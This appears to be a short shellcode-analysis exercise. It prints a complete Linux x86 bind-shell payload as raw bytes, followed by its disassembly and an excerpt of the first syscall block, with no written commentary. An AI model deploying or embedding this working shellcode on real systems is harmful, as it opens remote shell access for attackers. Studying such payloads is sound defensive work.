## Shellcode analysis case 3

----

#### Shellcode - Tiny bind shell

```
\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a
\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68
\x2b\x67\x6a\x10\x51\x50\xb0\x66\x89\xe1
\xcd\x80\x89\x51\x04\xb0\x66\xb3\x04\xcd
\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f
\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f
\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3
\x41\xcd\x80
```

**Disassembly:**
```assembly
0:  31 db                   xor    ebx,ebx
2:  f7 e3                   mul    ebx
4:  b0 66                   mov    al,0x66
6:  43                      inc    ebx
7:  52                      push   edx
8:  53                      push   ebx
9:  6a 02                   push   0x2
b:  89 e1                   mov    ecx,esp
d:  cd 80                   int    0x80
f:  5b                      pop    ebx
10: 5e                      pop    esi
11: 52                      push   edx
12: 66 68 2b 67             pushw  0x672b
16: 6a 10                   push   0x10
18: 51                      push   ecx
19: 50                      push   eax
1a: b0 66                   mov    al,0x66
1c: 89 e1                   mov    ecx,esp
1e: cd 80                   int    0x80
20: 89 51 04                mov    DWORD PTR [ecx+0x4],edx
23: b0 66                   mov    al,0x66
25: b3 04                   mov    bl,0x4
27: cd 80                   int    0x80
29: b0 66                   mov    al,0x66
2b: 43                      inc    ebx
2c: cd 80                   int    0x80
2e: 59                      pop    ecx
2f: 93                      xchg   ebx,eax
30: 6a 3f                   push   0x3f
32: 58                      pop    eax
33: cd 80                   int    0x80
35: 49                      dec    ecx
36: 79 f8                   jns    0x30
38: b0 0b                   mov    al,0xb
3a: 68 2f 2f 73 68          push   0x68732f2f
3f: 68 2f 62 69 6e          push   0x6e69622f
44: 89 e3                   mov    ebx,esp
46: 41                      inc    ecx
47: cd 80                   int    0x80
```

```assembly
mov    al,0x66
inc    ebx
push   edx
push   ebx
push   0x2
mov    ecx,esp
int    0x80
```
